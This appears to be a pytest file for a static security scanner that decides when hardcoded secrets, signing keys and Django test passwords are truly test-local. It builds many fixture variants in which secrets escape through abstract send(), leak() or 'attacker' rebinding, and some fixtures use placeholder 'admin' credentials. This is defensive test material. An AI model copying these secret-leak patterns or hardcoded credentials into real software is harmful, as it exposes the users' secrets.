                and all(row["severity"] == "CRITICAL" for row in active)
                and not observed
            ), report


def _signing267_lazy_variant(variant):
    eager = "    def check(self, signature):\n        verifier = SignatureVerifier(self._key)\n        return verifier.is_valid('body', 'timestamp', signature)\n"
    lazy = """    @property
    def verifier(self):
        if self._verifier is None:
            self._verifier = SignatureVerifier(self._key)
        return self._verifier
    def check(self, signature):
        return self.verifier.is_valid('body', 'timestamp', signature)
"""
    text = _OBJECT_SIGNING265.replace(eager, lazy).replace(
        "        self._key = key",
        "        self._key = key\n        self._verifier = None",
    )
    extras = {
        "field_export": "    def escape(self):\n        send(self._verifier)\n",
        "property_export": "    def escape(self):\n        send(self.verifier)\n",
        "property_alias": "    def escape(self):\n        alias = self.verifier\n        send(alias)\n",
        "property_return": "    def escape(self):\n        return self.verifier\n",
        "field_mutation": "    def replace(self):\n        self._verifier = attacker\n",
    }
    text = text.replace(
        "class TestSigning:", extras.get(variant, "") + "class TestSigning:"
    )
    replacements = {
        "getter_extra": [
            (
                "        return self._verifier",
                "        send(self._verifier)\n        return self._verifier",
            )
        ],
        "bound_method_export": [
            (
                "        self._key = key",
                "        self._key = key\n        register(self.check)",
            )
        ],
        "receiver_rebind": [
            (
                "        return self.verifier.is_valid",
                "        self = other\n        return self.verifier.is_valid",
            )
        ],
        "getter_default_effect": [
            ("def verifier(self):", "def verifier(self=mutate()):")
        ],
        "getter_annotation_effect": [
            ("def verifier(self):", "def verifier(self) -> mutate():")
        ],
    }
    for before, after in replacements.get(variant, []):
        text = text.replace(before, after)
    text = {
        "property_shadow": "property = transform\n" + text,
    }.get(variant, text)
    text += {
        "getter_replacement": "Gate.verifier = attacker\n",
        "signature_export": "        send(signature)\n",
        "receiver_rebind": "\nclass External:\n    def is_valid(self, body, timestamp, signature):\n        send(signature)\n        return True\nclass Remote:\n    verifier = External()\nother = Remote()\n",
    }.get(variant, "")
    return text


@pytest.mark.parametrize(
    "variant",
    [
        "closed",
        "alias",
        "nested",
        "export",
        "helper_export",
        "alias_export",
        "rebound_receiver",
        "helper_replacement",
        "helper_default",
        "helper_annotation",
        "missing_argument",
        "unused",
        "loop",
        "nested_capture",
        "rebind_alias",
        "before_assignment",
        "same_method_name",
    ],
)
def test_signing268_helper(tmp_path, variant):
    text = _signing268_helper_variant(variant)
    _write(tmp_path, "test_signing.py", text)
    line = next(
        node.lineno
        for node in ast.walk(ast.parse(text))
        if isinstance(node, ast.Constant)
        and node.value == "class-owned-signing-material"
    )
    for report in (
        security_scan(tmp_path),
        security_scan(tmp_path, cache_enabled=False),
    ):
        active = [
            row
            for row in report["findings"]
            if row["code"] == "SECURITY_HARDCODED_SECRET" and row["line"] == line
        ]
        observations = [
            row
            for row in report.get("primitive_observations", [])
            if row["code"] == "SECURITY_HARDCODED_SECRET" and row["line"] == line
        ]
        if variant in {"closed", "alias", "nested", "same_method_name"}:
            assert not active and observations, report
        else:
            assert (
                active
                and all(row["severity"] == "CRITICAL" for row in active)
                and not observations
            ), report


def _signing268_helper_variant(variant):
    text = _OBJECT_SIGNING265.replace(
        "    def test_roundtrip(self):",
        "    def signature(self, body: str):\n        return self.signer.generate_signature(body=body, timestamp='timestamp')\n    def test_roundtrip(self):",
    ).replace(
        "signature = self.signer.generate_signature(body='body', timestamp='timestamp')",
        "signature = self.signature('body')",
    )
    replacements = {
        "alias": [
            (
                "        return self.signer.generate_signature(body=body, timestamp='timestamp')",
                "        token = self.signer.generate_signature(body=body, timestamp='timestamp')\n        alias = token\n        return alias",
            )
        ],
        "nested": [
            (
                "    def test_roundtrip(self):",
                "    def envelope(self):\n        return self.signature('body')\n    def test_roundtrip(self):",
            ),
            ("signature = self.signature('body')", "signature = self.envelope()"),
        ],
        "alias_export": [
            (
                "        assert gate.check(signature)",
                "        alias = signature\n        send(alias)\n        assert gate.check(signature)",
            )
        ],
        "helper_export": [
            (
                "    def test_roundtrip(self):",
                "    def publish(self):\n        send(self.signature('body'))\n    def test_roundtrip(self):",
            )
        ],
        "rebound_receiver": [
            (
                "        signature = self.signature",
                "        self = remote\n        signature = self.signature",
            )
        ],
        "helper_replacement": [
            (
                "        signature = self.signature",
                "        self.signature = attacker\n        signature = self.signature",
            )
        ],
        "helper_default": [("body: str):", "body: str = mutate()):")],
        "helper_annotation": [("body: str):", "body: mutate()):")],
        "missing_argument": [
            ("signature = self.signature('body')", "signature = self.signature()")
        ],
        "unused": [("        assert gate.check(signature)\n", "")],
        "loop": [
            (
                "    def test_roundtrip(self):",
                "    def recurse(self):\n        return self.recurse() or self.signature('body')\n    def test_roundtrip(self):",
            ),
            ("signature = self.signature('body')", "signature = self.recurse()"),
        ],
        "nested_capture": [
            (
                "        assert gate.check(signature)",
                "        def escaped():\n            send(signature)\n        assert gate.check(signature)",
            )
        ],
        "rebind_alias": [
            (
                "        assert gate.check(signature)",
                "        signature = other\n        assert gate.check(signature)",
            )
        ],
        "before_assignment": [
            (
                "        signature = self.signature('body')",
                "        send(signature)\n        signature = self.signature('body')",
            )
        ],
        "same_method_name": [
            ("def signature(self,", "def generate_signature(self,"),
            (
                "signature = self.signature('body')",
                "signature = self.generate_signature('body')",
            ),
        ],
    }
    for before, after in replacements.get(variant, []):
        text = text.replace(before, after)
    text += {"export": "        send(signature)\n"}.get(variant, "")
    return text


def _identity_transfer_capture(tmp_path, files):
    import ast
    import hashlib

    from factoryline import mock_fixture_provenance as fixture

    root = tmp_path / "captured"
    modules, raw_sources, inventory = {}, {}, {}
    for relative, source in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        raw = source.encode()
        digest = hashlib.sha256(raw).hexdigest()
        tree = ast.parse(raw, filename=str(path))
        tree._oracle_source_sha256 = digest
        modules[path] = tree
        raw_sources[path] = raw
        inventory[path] = digest
    return fixture.application_test_index(
        root, modules, raw_sources, inventory
    ), modules


def test_captured_constructor_field_transfer_binds_exact_caller_argument(tmp_path):
    from factoryline import credential_role_identity_effects as effects

    index, modules = _identity_transfer_capture(
        tmp_path,
        {
            "pkg/__init__.py": "",
            "pkg/packet.py": "class Packet:\n    def __init__(self, *, body):\n        self.body = body\n",
            "pkg/test_packet.py": (
                "from pkg.packet import Packet\n"
                "class TestPacket:\n"
                "    def test_build(self):\n"
                "        payload = 'raw'\n"
                "        packet = Packet(body=payload)\n"
            ),
        },
    )
    assert index is not None
    path = next(path for path in modules if path.name == "test_packet.py")
    method = next(
        node
        for node in modules[path].body[1].body
        if isinstance(node, ast.FunctionDef) and node.name == "test_build"
    )
    call = next(
        node
        for node in ast.walk(method)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "Packet"
    )

    result = effects._app_bound_field_transfer(index, path, call, method, "body")

    assert result is not None
    assert result["formal"] == "body"
    assert ast.unparse(result["actual"]) == "payload"
    assert result["transfer"].source_roots == ("input:body",)
    assert isinstance(result["transfer"].statement, ast.Assign)


@pytest.mark.parametrize(
    "body",
    [
        "self.body = value\n        self.body = other",
        "if ready:\n            self.body = value",
    ],
)
def test_captured_constructor_field_transfer_declines_ambiguous_writes(tmp_path, body):
    from factoryline import credential_role_identity_effects as effects

    index, modules = _identity_transfer_capture(
        tmp_path,
        {
            "pkg/__init__.py": "",
            "pkg/packet.py": (
                "class Packet:\n"
                "    def __init__(self, *, value, other='x', ready=False):\n"
                f"        {body}\n"
            ),
            "pkg/test_packet.py": (
                "from pkg.packet import Packet\n"
                "class TestPacket:\n"
                "    def test_build(self):\n"
                "        packet = Packet(value='a', other='b', ready=check())\n"
            ),
        },
    )
    assert index is not None
    path = next(path for path in modules if path.name == "test_packet.py")
    method = next(
        node
        for node in modules[path].body[1].body
        if isinstance(node, ast.FunctionDef) and node.name == "test_build"
    )
    call = next(
        node
        for node in ast.walk(method)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == "Packet"
    )

    assert effects._app_bound_field_transfer(index, path, call, method, "body") is None


def test_role_helper274_epoch_does_not_bind_transient_module_init(tmp_path):
    from factoryline import review_audits as audit

    keys = [audit._oracle_context_cache_key(tmp_path, [], {}) for _ in range(3)]
    assert len(set(keys)) == 1


@pytest.mark.parametrize("call", [
    "loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN)",
    "loading.get_auth_plugin_conf_options(plugin=PASSWORD_PLUGIN)",
])
def test_plugin_selector_role_is_bound_api_metadata_not_authentication(tmp_path, call):
    evidence = _metadata143_projection(tmp_path,
        "from keystoneauth1 import loading\nPASSWORD_PLUGIN = 'password'\n"
        f"def options():\n    return {call}\n", "PASSWORD_PLUGIN")
    assert evidence["eligible"] is True
    assert evidence["profile"] == "STATIC_API_DATA_ROLE"
    assert {row["role"] for row in evidence["uses"]} == {"PLUGIN_LOADER_NAME"}


@pytest.mark.parametrize("suffix, extras", [
    ("send(PASSWORD_PLUGIN)\n", {}),
    ("loading.get_auth_plugin_conf_options = send\n", {}),
    ("alias = loading\nalias.get_auth_plugin_conf_options = send\n", {}),
    ("PASSWORD_PLUGIN = other\n", {}),
    ("def leak(loading):\n    return loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN)\n", {}),
    ("loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN, plugin='other')\n", {}),
    ("loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN, other)\n", {}),
    ("loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN, secret='other')\n", {}),
    ("loading.load_auth_from_conf_options(conf, group, password=PASSWORD_PLUGIN)\n", {}),
    ("", {"peer.py": "from sample import PASSWORD_PLUGIN\nsend(PASSWORD_PLUGIN)\n"}),
    ("", {"keystoneauth1.py": "def get_auth_plugin_conf_options(plugin):\n    send(plugin)\n"}),
])
def test_plugin_selector_role_keeps_credential_consumers_escapes_and_mutations(tmp_path, suffix, extras):
    evidence = _metadata143_projection(tmp_path,
        "from keystoneauth1 import loading\nPASSWORD_PLUGIN = 'password'\n"
        "loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN)\n" + suffix,
        "PASSWORD_PLUGIN", extras=extras)
    assert evidence["eligible"] is False


@pytest.mark.parametrize("additional", ["", "send(PASSWORD_PLUGIN)\n", "loading.get_auth_plugin_conf_options = send\n"])
def test_plugin_selector_native_metadata_rebuild_preserves_unknown_consumers(tmp_path, additional):
    from factoryline import review_audits as audit

    path = tmp_path / "sample.py"
    path.write_text("from keystoneauth1 import loading\nPASSWORD_PLUGIN = 'password'\n"
                    "def options():\n    return loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN)\n"
                    + additional, encoding="utf8")
    report = audit.security_scan(tmp_path, cache_enabled=False, defect_policy="source-role-v2")
    assert report["audit_coverage"]["complete"] is True
    rows = [r for r in report["finding_tier_report"]["ledger"]
            if r["raw_finding"]["code"] == "SECURITY_HARDCODED_SECRET"]
    assert len(rows) == 1
    assert (rows[0]["tier"] == "PROVEN_PRIMITIVE") is (additional == "")
    assert bool([f for f in report["findings"] if f["code"] == "SECURITY_HARDCODED_SECRET"]) is bool(additional)
    assert audit._seal_security_scan(report.copy())["finding_tier_report"] == report["finding_tier_report"]


def test_presentation352_warm_rebuild_rejects_changed_provider_mutation_helper(tmp_path, monkeypatch):
    from factoryline import finite_capture, primitive_observation_binding as binding
    from factoryline import review_audits as audit

    (tmp_path / "sample.py").write_text(
        "from keystoneauth1 import loading\nPASSWORD_PLUGIN = 'password'\n"
        "loading.get_auth_plugin_conf_options(PASSWORD_PLUGIN)\n", encoding="utf8")
    (tmp_path / "peer.py").write_text("unchanged = 1\n", encoding="utf8")
    report = audit.security_scan(tmp_path, cache_enabled=False, defect_policy="source-role-v2")
    finding = report["finding_tier_report"]["ledger"][0]["raw_finding"]
    facts = finding["facts"]
    evidence = facts["fixture_evidence"]
    captured = dict(report._captured_sources)
    hashes = {row["path"]: row["sha256"] for row in report["sources"]}
    original = finite_capture._provider_mutation_for_node
    calls = []
    foreign_calls = []

    def forbidden_foreign_reparse(*args):
        foreign_calls.append(True)
        raise AssertionError("Presentation rebuild has no foreign source-context cache")

    monkeypatch.setattr(finite_capture, "_foreign_provider_inputs", forbidden_foreign_reparse)

    def changed(*args):
        original(*args)
        args[5].add(("keystoneauth1.loading", "*"))
        calls.append(True)

    token = binding._ROLE_REBUILD_CONTEXT.set({})
    try:
        assert binding._presentation_data_role_recomputes(evidence, hashes, facts, captured)
        assert binding._presentation_data_role_recomputes(evidence, hashes, facts, captured)
        assert not foreign_calls
        monkeypatch.setattr(finite_capture, "_provider_mutation_for_node", changed)
        assert not binding._presentation_data_role_recomputes(evidence, hashes, facts, captured)
        assert calls
    finally:
        binding._ROLE_REBUILD_CONTEXT.reset(token)


@pytest.mark.parametrize("sources", [
    {"a.py": "x = 1", "b.py": "def helper():\n    return 1"},
    {"a.py": "class A:\n    def __reduce__(self):\n        return (str, ('a',))"},
    {"a.py": "class A:\n    def __reduce__(self):\n        return eval('1')"},
    {"a.py": "class A:\n    def __setstate__(self, state):\n        helper()", "b.py": "def helper():\n    import os\n    os.system('echo x')"},
    {"a.py": "class A:\n    def __new__(cls):\n        first()", "b.py": "def first():\n    second()\ndef second():\n    first()"},
    {"a.py": "class A:\n    def __getstate__(self):\n        helper()", "b.py": "def helper():\n    return 1", "c.py": "def helper():\n    open('x')"},
])
def test_callback363_global_graph_matches_per_module_risk_union(sources):
    import ast
    from factoryline import primitive_observation_binding as binding

    trees = {path: ast.parse(source) for path, source in sources.items()}
    before = any(binding._pickle_role_callback_risk(tree, trees.values()) for tree in trees.values())
    assert binding._pickle_role_callback_risk(None, trees.values()) == before


def test_callback363_inventory_builds_one_repository_callback_graph(monkeypatch):
    from factoryline import primitive_observation_binding as binding

    original = binding._pickle_role_callback_risk
    calls = []

    def observed(tree, trees=None):
        calls.append(tree)
        return original(tree, trees)

    monkeypatch.setattr(binding, "_pickle_role_callback_risk", observed)
    inventory = binding._pickle_role_inventory({f"module_{i}.py": b"def local():\n    return 1\n" for i in range(32)})
    assert inventory["unsafe_callbacks"] is False
    assert calls == [None]


@pytest.mark.parametrize("base", ["TestCase", "SimpleTestCase", "TransactionTestCase"])
def test_testrole364_django_inheritance_binds_fixture_owner_without_local_unittest_import(base):
    import ast
    from factoryline import primitive_observation_binding as binding

    source = (f"from django.test import {base} as Parent\nimport pickle\n"
              "class RoundTrips(Parent):\n    def test_roundtrip(self):\n"
              "        value = pickle.loads(pickle.dumps('sample'))\n        self.assertEqual(value, 'sample')\n")
    tree = ast.parse(source)
    inventory = binding._pickle_role_inventory({"tests/test_values.py": source.encode()})
    finding = {"line": 5, "column": 16}
    scope = binding._pickle_role_test_scope(inventory['trees']['tests/test_values.py'], finding, inventory)
    assert scope is not None and scope.name == "test_roundtrip"
    assert tree.body[2].name == "RoundTrips"


@pytest.mark.parametrize("extra", [
    {"django.py": b"class test: pass\n"},
    {"django/test/__init__.py": b"class TestCase: pass\n"},
    {"mutator.py": b"import django.test\ndjango.test.TestCase = replacement\n"},
])
def test_testrole364_django_shadow_and_base_mutation_stay_unknown(extra):
    from factoryline import primitive_observation_binding as binding

    source = b"from django.test import TestCase\nimport pickle\nclass RoundTrips(TestCase):\n    def test_roundtrip(self):\n        value = pickle.loads(pickle.dumps('sample'))\n        self.assertEqual(value, 'sample')\n"
    inventory = binding._pickle_role_inventory({"tests/test_values.py": source, **extra})
    assert binding._pickle_role_test_scope(inventory['trees']['tests/test_values.py'], {"line": 5, "column": 16}, inventory) is None


def test_testrole364_captured_unittest_base_is_registration_for_importing_module():
    from factoryline import primitive_observation_binding as binding

    sources = {
        "tests/base.py": b"import unittest\nclass Base(unittest.TestCase):\n    pass\n",
        "tests/test_values.py": b"from tests.base import Base\nimport pickle\nclass RoundTrips(Base):\n    def test_roundtrip(self):\n        value = pickle.loads(pickle.dumps('sample'))\n        self.assertEqual(value, 'sample')\n",
    }
    inventory = binding._pickle_role_inventory(sources)
    assert binding._pickle_role_test_scope(inventory['trees']['tests/test_values.py'], {"line": 5, "column": 16}, inventory) is not None


@pytest.mark.parametrize("shadow", ["src/django.py", "src/django/test.py"])
def test_testrole364_src_shadow_is_not_a_framework_contract(shadow):
    from factoryline import primitive_observation_binding as binding

    source = b"from django.test import TestCase\nclass Sample(TestCase):\n    pass\n"
    inventory = binding._pickle_role_inventory({"tests/test_values.py": source, shadow: b"pass\n"})
    assert not binding._pickle_role_unittest_owners(inventory)


@pytest.mark.parametrize("module", ["django.test", "django.test.testcases"])
def test_testrole364_alias_mutation_invalidates_both_public_framework_paths(module):
    from factoryline import primitive_observation_binding as binding

    source = b"from django.test import TestCase\nfrom django.test.testcases import TestCase as Other\nclass Sample(TestCase):\n    pass\nclass Second(Other):\n    pass\n"
    mutation = f"import {module}\n{module}.TestCase.__bases__ = replacement\n".encode()
    inventory = binding._pickle_role_inventory({"tests/test_values.py": source, "mutator.py": mutation})
    assert not binding._pickle_role_unittest_owners(inventory)


def test_callback363_aliases_are_shared_only_within_one_inventory_traversal(monkeypatch):
    import ast
    from factoryline import primitive_observation_binding as binding
    from factoryline import review_audits as audit

    tree = ast.parse("class Sample:\n    def __getstate__(self):\n        return 1\n    def __setstate__(self, state):\n        return None\n")
    calls = []
    original = audit._security_aliases

    def observed(nodes):
        calls.append(1)
        return original(nodes)

    monkeypatch.setattr(audit, "_security_aliases", observed)
    assert binding._pickle_role_callback_risk(None, [tree]) is False
    assert calls == [1]
    assert binding._pickle_role_callback_risk(None, [tree]) is False
    assert calls == [1, 1]


def test_testrole364_shared_graph_helpers_invalidate_provenance_on_replacement(monkeypatch):
    from factoryline import primitive_observation_binding as binding

    names = ("_pickle_role_inventory", "_pickle_role_test_scope", "_pickle_role_unittest_owners",
             "_pickle_role_unittest_graph", "_pickle_role_callback_risk")
    assert all(getattr(binding, name) in binding.primitive_binding_helpers() for name in names)
    original = binding._pickle_role_callback_risk

    def replacement(*args):
        return True

    monkeypatch.setattr(binding, "_pickle_role_callback_risk", replacement)
    helpers = binding.primitive_binding_helpers()
    assert replacement in helpers and original not in helpers


def test_testrole367_local_django_api_strings_require_one_captured_binding(tmp_path):
    import ast
    from factoryline import credential_role_identity_effects as effects

    index, modules = _identity_transfer_capture(
        tmp_path,
        {"tests/test_login.py": (
            "def _login():\n"
            "    account_name = 'admin'\n"
            "    contact = 'admin@example.test'\n"
            "    return account_name, contact\n"
        )},
    )
    path = next(iter(modules))
    assert index["source"].validate(path)
    helper = modules[path].body[0]
    names = [node for node in ast.walk(helper) if isinstance(node, ast.Name)]
    account_name = next(node for node in names if node.id == "account_name" and isinstance(node.ctx, ast.Load))
    contact = next(node for node in names if node.id == "contact" and isinstance(node.ctx, ast.Load))
    assert effects._fixture_string_literal(index, path, helper, account_name) == "admin"
    assert effects._fixture_string_literal(index, path, helper, contact) == "admin@example.test"

    helper.body.insert(1, ast.parse("account_name = supplied_value").body[0])
    ast.fix_missing_locations(helper)
    assert effects._fixture_string_literal(index, path, helper, account_name) is None


_TESTROLE367_DJANGO_HELPER = (
    "from django.test import TestCase, Client\n"
    "from django.contrib.auth.models import User\n"
    "class AccountChecks(TestCase):\n"
    "    def setUp(self):\n"
    "        self.assertTrue(self._login())\n"
    "    def _login(self):\n"
    "        account_name = 'admin'\n"
    "        contact = 'admin@example.test'\n"
    "        password = 'admin'\n"
    "        self.browser = Client()\n"
    "        self.account = User.objects.create_superuser(account_name, contact, password)\n"
    "        return self.browser.login(username=account_name, password=password)\n"
    "    def test_page(self):\n"
    "        self.browser.get('/')\n"
    "        account_id = self.account.pk\n"
)


def _testrole367_fixture_evidence(tmp_path, source, extras=None):
    import ast
    from factoryline import mock_fixture_provenance as fixture

    files = {"tests/test_views.py": source, "tests/__init__.py": ""}
    files.update(extras or {})
    index, modules = _identity_transfer_capture(tmp_path, files)
    path = next(iter(modules))
    tree = modules[path]
    assignment = next(
        node for node in ast.walk(tree)
        if isinstance(node, ast.Assign)
        and len(node.targets) == 1
        and isinstance(node.targets[0], ast.Name)
        and node.targets[0].id == "password"
    )
    return fixture.application_test_secret_evidence(
        index, path, assignment.value.lineno, assignment.value.value
    )


def test_testrole367_registered_django_helper_requires_complete_authority_closure(tmp_path):
    evidence = _testrole367_fixture_evidence(tmp_path, _TESTROLE367_DJANGO_HELPER)
    assert evidence["eligible"] is True
    assert evidence["profile"] == "SOURCE_BOUND_FACTORY_TEST_AUTHORITY"
    closure = evidence["consumer_use_closure"]
    assert closure["complete"] is True
    assert closure["credential"]["complete"] is True
    assert closure["account_field"]["complete"] is True
    assert closure["client_field"]["complete"] is True


@pytest.mark.parametrize("variant", [
    "password_escape", "whole_user_escape", "client_escape", "username_mismatch",
    "helper_export", "creation_order", "provider_replacement", "custom_user", "field_rebind",
    "receiver_alias_escape", "receiver_escape", "client_field_rebind", "outside_owner_call",
    "unbound_helper_export", "cross_module_owner_call", "nested_cross_module_owner_call",
    "conditional_client_override",
])
def test_testrole367_registered_django_helper_keeps_escaped_or_rebound_authority_active(
    tmp_path, variant
):
    source = _TESTROLE367_DJANGO_HELPER
    if variant == "password_escape":
        source = source.replace("        password = 'admin'\n", "        password = 'admin'\n        disclose(password)\n")
    elif variant == "whole_user_escape":
        source = source.replace("        account_id = self.account.pk\n", "        account_id = self.account.pk\n        Request(user=self.account)\n")
    elif variant == "client_escape":
        source = source.replace("        account_id = self.account.pk\n", "        account_id = self.account.pk\n        disclose(self.browser)\n")
    elif variant == "username_mismatch":
        source = source.replace("username=account_name, password=password", "username='different', password=password")
    elif variant == "helper_export":
        source = source.replace("        self.assertTrue(self._login())\n", "        self.saved_login = self._login\n        self.assertTrue(self._login())\n")
    elif variant == "creation_order":
        creation = "        self.account = User.objects.create_superuser(account_name, contact, password)\n"
        login = "        return self.browser.login(username=account_name, password=password)\n"
        source = source.replace(creation + login, login + creation)
    elif variant == "provider_replacement":
        source = source.replace("        self.browser = Client()\n", "        Client = replacement\n        self.browser = Client()\n")
    elif variant == "custom_user":
        source = source.replace("from django.contrib.auth.models import User", "from application.models import User")
    elif variant == "field_rebind":
        source = source.replace("        account_id = self.account.pk\n", "        self.account = replacement\n        account_id = self.account.pk\n")
    elif variant == "receiver_alias_escape":
        source = source.replace("        account_id = self.account.pk\n", "        alias = self\n        leak(alias.account.password)\n        account_id = self.account.pk\n")
    elif variant == "receiver_escape":
        source = source.replace("        account_id = self.account.pk\n", "        leak(self)\n        account_id = self.account.pk\n")
    elif variant == "client_field_rebind":
        source = source.replace("        self.browser.get('/')\n", "        self.browser = replacement\n        self.browser.get('/')\n")
    elif variant == "outside_owner_call":
        source += "instance = AccountChecks()\ninstance._login()\n"
    elif variant == "unbound_helper_export":
        source += "AccountChecks._login(holder)\n"
    elif variant == "cross_module_owner_call":
        evidence = _testrole367_fixture_evidence(
            tmp_path, source,
            {"tests/external.py": (
                "from tests.test_views import AccountChecks as Subject\n"
                "instance = Subject()\ninstance._login()\n"
            )},
        )
        assert evidence["eligible"] is False
        return
    elif variant == "nested_cross_module_owner_call":
        evidence = _testrole367_fixture_evidence(
            tmp_path, source,
            {"tests/external.py": (
                "def boot():\n"
                "    from tests.test_views import AccountChecks as Subject\n"
                "    Subject()._login()\n"
            )},
        )
        assert evidence["eligible"] is False
        return
    elif variant == "conditional_client_override":
        source = source.replace(
            "class AccountChecks(TestCase):\n",
            "class AccountChecks(TestCase):\n    if True:\n        client_class = RemoteClient\n",
        )
    evidence = _testrole367_fixture_evidence(tmp_path, source)
    assert evidence["eligible"] is False


def test_shared_source_inventory_reuses_validated_trees(tmp_path, monkeypatch):
    import ast
    import hashlib
    from factoryline import review_audits as audit
    from factoryline.credential_role_constructor_provider import security_snapshot_model as _security_snapshot_model
    from factoryline.primitive_observation_binding import _pickle_role_inventory
    path = tmp_path / 'sample.py'
    raw = b'import pickle\ndef test_roundtrip():\n    assert pickle.loads(pickle.dumps(3)) == 3\n'
    tree = ast.parse(raw)
    tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
    model = _security_snapshot_model(tmp_path, {path: tree}, {path: raw}, {path: audit._oracle_tree_fingerprint(tree)})
    assert model.validate(path)
    def forbidden(*args, **kwargs):
        raise AssertionError('validated producer must not reparse')
    monkeypatch.setattr(ast, 'parse', forbidden)
    inventory = _pickle_role_inventory({'sample.py': raw}, source_model=model)
    assert inventory['trees']['sample.py'] is tree
    assert inventory['sources'] == {'sample.py': raw}


@pytest.mark.parametrize('corruption', ['bytes', 'tree', 'inventory'])
def test_shared_source_inventory_declines_stale_capture(tmp_path, corruption):
    import ast
    import hashlib
    from factoryline import review_audits as audit
    from factoryline.credential_role_constructor_provider import security_snapshot_model as _security_snapshot_model
    from factoryline.primitive_observation_binding import _pickle_role_inventory
    path = tmp_path / 'sample.py'
    raw = b'VALUE = 1\n'
    tree = ast.parse(raw)
    tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
    model = _security_snapshot_model(tmp_path, {path: tree}, {path: raw}, {path: audit._oracle_tree_fingerprint(tree)})
    assert model.validate(path)
    if corruption == 'bytes':
        model.source_bytes[path] = b'VALUE = 2\n'
    elif corruption == 'tree':
        tree.body[0].value.value = 2
    else:
        model.inventory[path] = '0' * 64
    assert _pickle_role_inventory({'sample.py': raw}, source_model=model) is None


@pytest.mark.parametrize("variant", [
    "receiver_rebound", "instance_assertion_replaced", "class_assertion_replaced",
    "reexport_terminal_replaced", "reexport_terminal_code_replaced",
    "algorithm_callback_elsewhere", "algorithm_provider_replaced", "wildcard_provider",
    "extra_digest_escape", "helper_default_mutated", "unknown_format_operand",
    "receiver_escape", "receiver_alias", "reflective_receiver", "class_decorator",
    "class_metaclass", "hmac_readonly_precondition_false",
    "hmac_lexical_shadow_callback",
    "hmac_outer_shadow_callback", "hmac_class_shadow_callback",
    "receiver_alias_assertion_write", "receiver_alias_nested_assertion_write",
])
def test_shared_digest372_adversarial_oracle_and_provider(tmp_path, variant):
    from factoryline import mock_fixture_provenance as fixture

    helper = "import hmac\nimport hashlib\ndef calculate(key, timestamp, body):\n    message = '{}.{}'.format(timestamp, body).encode()\n    return hmac.new(key.encode(), message, hashlib.sha256).hexdigest()\n"
    caller = "from django.test import TestCase\nimport codec\nclass Checks(TestCase):\n    def test_local_key(self):\n        secret = 'owned-digest-input'\n        body = '{}'\n        observed = codec.calculate(secret, 1000, body)\n        self.assertEqual(observed, codec.calculate(secret, 1000, body))\n"
    sources = {}
    if variant == "receiver_alias_assertion_write":
        caller = caller.replace("        body =", "        peer = self\n        peer.assertEqual = publish\n        body =")
    elif variant == "receiver_alias_nested_assertion_write":
        caller = caller.replace("        body =", "        peer = self\n        def change():\n            peer.assertEqual = publish\n        change()\n        body =")
    elif variant == "hmac_outer_shadow_callback":
        helper += "def outer(hmac):\n    def inner():\n        return hmac.new(b'other', b'payload', hashlib.sha256)\n    return inner\n"
    elif variant == "hmac_class_shadow_callback":
        helper += "class Foreign:\n    hmac = opaque\n    value = hmac.new(b'other', b'payload', hashlib.sha256)\n"
    elif variant == "hmac_lexical_shadow_callback":
        helper += "def unknown(hmac):\n    hmac.new(b'other', b'payload', hashlib.sha256)\n"
    elif variant == "receiver_escape":
        caller += "        opaque(self)\n"
    elif variant == "receiver_alias":
        caller = caller.replace("        body =", "        other = self\n        opaque(other)\n        body =")
    elif variant == "reflective_receiver":
        caller += "        getattr(self, 'assertEqual')(observed, observed)\n"
    elif variant == "class_decorator":
        caller = caller.replace("class Checks", "@replace_owner\nclass Checks")
    elif variant == "class_metaclass":
        caller = caller.replace("class Checks(TestCase):", "class Checks(TestCase, metaclass=Unknown):")
    elif variant == "hmac_readonly_precondition_false":
        helper += "hmac.new = replace_and_capture_callback\n"
    elif variant == "receiver_rebound":
        caller = caller.replace("        body =", "        self = replacement\n        body =")
    elif variant == "instance_assertion_replaced":
        caller = caller.replace("        body =", "        self.assertEqual = publish\n        body =")
    elif variant == "class_assertion_replaced":
        caller += "Checks.assertEqual = publish\n"
    elif variant.startswith("reexport_terminal"):
        caller = caller.replace("import codec", "import bridge as codec")
        sources["bridge.py"] = "from codec import calculate\n"
        suffix = ".__code__" if variant.endswith("code_replaced") else ""
        sources["peer.py"] = "import codec\ncodec.calculate" + suffix + " = replacement\n"
    elif variant == "algorithm_callback_elsewhere":
        helper += "opaque(hashlib.sha256)\n"
    elif variant == "algorithm_provider_replaced":
        helper += "hashlib.sha256 = replacement\n"
    elif variant == "wildcard_provider":
        helper += "from opaque import *\n"
    elif variant == "extra_digest_escape":
        caller += "        publish(observed)\n"
    elif variant == "helper_default_mutated":
        helper += "calculate.__defaults__ = replacement\n"
        caller += "codec.calculate.__defaults__ = replacement\n"
    elif variant == "unknown_format_operand":
        caller = caller.replace("body = '{}'", "body = custom_object")
    sources.update({"codec.py": helper, "test_flow.py": caller})
    modules, captured, inventory = {}, {}, {}
    for name, text in sources.items():
        path = tmp_path / name
        raw = text.encode()
        tree = ast.parse(raw)
        tree._oracle_source_sha256 = hashlib.sha256(raw).hexdigest()
        modules[path], captured[path], inventory[path] = tree, raw, tree._oracle_source_sha256
    index = fixture.application_test_index(tmp_path, modules, captured, inventory)
    evidence = fixture.application_test_secret_evidence(index, tmp_path / "test_flow.py", 5, "owned-digest-input")
    assert evidence.get("eligible") is not True, evidence
